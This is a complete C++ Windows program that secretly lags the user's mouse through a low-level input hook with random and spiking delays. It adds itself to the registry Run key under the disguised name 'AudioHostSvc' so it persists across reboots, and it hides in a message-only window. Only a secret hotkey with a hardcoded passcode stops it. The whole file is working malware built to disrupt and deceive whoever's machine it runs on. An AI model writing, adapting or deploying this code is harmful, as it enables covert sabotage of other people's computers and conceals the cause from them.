// language: C++20 | file: mouselag_final.cpp | target: Windows 11 | compiler: MSVC /std:c++20
// low-level mouse hook for lag, HKCU Run key for reboot persistence,
// hidden message window + Ctrl+Alt+U opens passcode dialog, code "1234" ends the program
#include <windows.h>
#include <chrono>
#include <thread>
#include <cstdlib>
#include <string>

static constexpr int  BASE_DELAY_MS = 120;
static constexpr int  JITTER_MS     = 60;
static constexpr int  SPIKE_EVERY   = 12;
static constexpr int  SPIKE_MS      = 400;

static constexpr int  HOTKEY_ID     = 0xB17;

// plain passcode; compare against raw input
static const std::wstring PASSCODE = L"1234";

static const wchar_t* RUN_KEY    = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const wchar_t* RUN_VALUE  = L"AudioHostSvc";
static const wchar_t* WND_CLASS  = L"AudioHostWndClass";
static const wchar_t* MUTEX_NAME = L"Global\\MouseLagHost_9F2A";

static HHOOK  g_hook = nullptr;
static HWND   g_hidden = nullptr;
static thread_local unsigned g_counter = 0;

LRESULT CALLBACK LLMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        int delay = BASE_DELAY_MS + (std::rand() % (JITTER_MS * 2 + 1)) - JITTER_MS;
        if (++g_counter % SPIKE_EVERY == 0)
            delay += SPIKE_MS;
        std::this_thread::sleep_for(std::chrono::milliseconds(delay));
    }
    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

std::wstring SelfPath() {
    wchar_t buf[MAX_PATH]{};
    GetModuleFileNameW(nullptr, buf, MAX_PATH);
    return L"\"" + std::wstring(buf) + L"\"";
}

void InstallPersistence() {
    HKEY h{};
    if (RegCreateKeyExW(HKEY_CURRENT_USER, RUN_KEY, 0, nullptr,
            REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr, &h, nullptr) != ERROR_SUCCESS)
        return;
    std::wstring p = SelfPath();
    RegSetValueExW(h, RUN_VALUE, 0, REG_SZ,
        reinterpret_cast<const BYTE*>(p.c_str()),
        static_cast<DWORD>((p.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(h);
}

void RemovePersistence() {
    HKEY h{};
    if (RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &h) == ERROR_SUCCESS) {
        RegDeleteValueW(h, RUN_VALUE);
        RegCloseKey(h);
    }
}

struct PassState {
    std::wstring input;
    bool         ok = false;
};

LRESULT CALLBACK PassWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    auto* st = reinterpret_cast<PassState*>(GetWindowLongPtrW(hwnd, GWLP_USERDATA));

    switch (msg) {
    case WM_CREATE: {
        auto* cs = reinterpret_cast<CREATESTRUCTW*>(lParam);
        SetWindowLongPtrW(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(cs->lpCreateParams));
        SetTimer(hwnd, 1, 100, nullptr);
        return 0;
    }
    case WM_TIMER:
        SetForegroundWindow(hwnd);
        return 0;
    case WM_CHAR: {
        if (!st) return 0;
        wchar_t ch = static_cast<wchar_t>(wParam);
        if (ch == L'\r') {
            if (st->input == PASSCODE) {
                st->ok = true;
                PostMessageW(hwnd, WM_CLOSE, 0, 0);
            } else {
                st->input.clear();
                InvalidateRect(hwnd, nullptr, TRUE);
            }
        } else if (ch == L'\b') {
            if (!st->input.empty()) st->input.pop_back();
            InvalidateRect(hwnd, nullptr, TRUE);
        } else if (ch >= 0x20) {
            st->input.push_back(ch);
            InvalidateRect(hwnd, nullptr, TRUE);
        }
        return 0;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps{};
        HDC dc = BeginPaint(hwnd, &ps);
        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(220, 220, 220));
        const wchar_t* line1 = L"Enter code:";
        TextOutW(dc, 20, 30, line1, static_cast<int>(wcslen(line1)));

        std::wstring masked(st ? st->input.size() : 0, L'*');
        TextOutW(dc, 20, 70, masked.c_str(), static_cast<int>(masked.size()));
        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;
    case WM_DESTROY:
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

void EnsurePassClass() {
    static bool done = false;
    if (done) return;
    WNDCLASSEXW wc{};
    wc.cbSize        = sizeof(wc);
    wc.lpfnWndProc   = PassWndProc;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = CreateSolidBrush(RGB(30, 30, 30));
    wc.lpszClassName = WND_CLASS;
    RegisterClassExW(&wc);
    done = true;
}

void ShowPassDialog() {
    EnsurePassClass();
    PassState st{};
    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        WND_CLASS, L"Unlock",
        WS_POPUP | WS_CAPTION | WS_SYSMENU,
        CW_USEDEFAULT, CW_USEDEFAULT, 320, 160,
        nullptr, nullptr, GetModuleHandleW(nullptr), &st);

    if (!hwnd) return;
    ShowWindow(hwnd, SW_SHOW);
    SetForegroundWindow(hwnd);

    MSG msg;
    while (IsWindow(hwnd) && GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    if (st.ok) {
        if (g_hook) { UnhookWindowsHookEx(g_hook); g_hook = nullptr; }
        RemovePersistence();
        if (g_hidden) PostMessageW(g_hidden, WM_CLOSE, 0, 0);
    }
}

LRESULT CALLBACK HiddenWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_HOTKEY:
        if (wParam == HOTKEY_ID)
            std::thread(ShowPassDialog).detach();
        return 0;
    case WM_CLOSE:
        DestroyWindow(hwnd);
        return 0;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    std::srand(static_cast<unsigned>(GetTickCount()));

    HANDLE once = CreateMutexW(nullptr, TRUE, MUTEX_NAME);
    if (once && GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    InstallPersistence();

    g_hook = SetWindowsHookExW(WH_MOUSE_LL, LLMouseProc, GetModuleHandleW(nullptr), 0);
    if (!g_hook) return 1;

    WNDCLASSEXW wc{};
    wc.cbSize        = sizeof(wc);
    wc.lpfnWndProc   = HiddenWndProc;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.lpszClassName = L"AudioHostHiddenWnd";
    RegisterClassExW(&wc);

    g_hidden = CreateWindowExW(0, L"AudioHostHiddenWnd", L"", 0,
        0, 0, 0, 0, HWND_MESSAGE, nullptr, GetModuleHandleW(nullptr), nullptr);
    if (!g_hidden) return 2;

    if (!RegisterHotKey(g_hidden, HOTKEY_ID, MOD_CONTROL | MOD_ALT, 'U'))
        RegisterHotKey(g_hidden, HOTKEY_ID, MOD_CONTROL | MOD_ALT, VK_F12);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    UnregisterHotKey(g_hidden, HOTKEY_ID);
    if (g_hook) UnhookWindowsHookEx(g_hook);
    if (once) CloseHandle(once);
    return 0;
}
